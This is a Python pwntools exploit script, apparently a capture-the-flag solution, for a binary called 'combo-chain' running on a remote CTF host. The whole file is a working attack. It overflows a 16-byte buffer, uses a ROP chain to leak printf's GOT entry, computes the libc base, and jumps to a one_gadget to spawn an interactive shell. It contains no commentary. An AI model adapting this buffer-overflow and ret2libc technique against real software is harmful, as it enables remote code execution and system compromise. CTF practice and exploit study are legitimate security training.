from pwn import *
#p = process('./combo-chain')
#gdb.attach(p)
libc = ELF('./libc.so.6')
p = remote('pwn.hsctf.com',2345)
printf_got = p64(0x0000000000403fe8)
printf_plt = p64(0x0000000000401050)
pop_rdi = p64(0x0000000000401263)
main = p64(0x0000000000401166)
ret = p64(0x000000000040101a)
binsh = p64(0x402031)

p.recvuntil("Enter the right combo for some COMBO CARNAGE!: ")

exp  = "a"*16
exp += ret
exp += pop_rdi
exp += printf_got
exp += printf_plt
exp += ret
exp += main

p.sendline(exp)
leak = u64(p.recv(6).strip()+"\x00\x00")
print hex(leak)
base = leak-0x20740
one = base + 0xf1147

p.recvuntil("Enter the right combo for some COMBO CARNAGE!: ")

exp  = "a"*16
exp += ret
exp += p64(one)
exp += ret
exp += main

p.sendline(exp)

p.interactive()
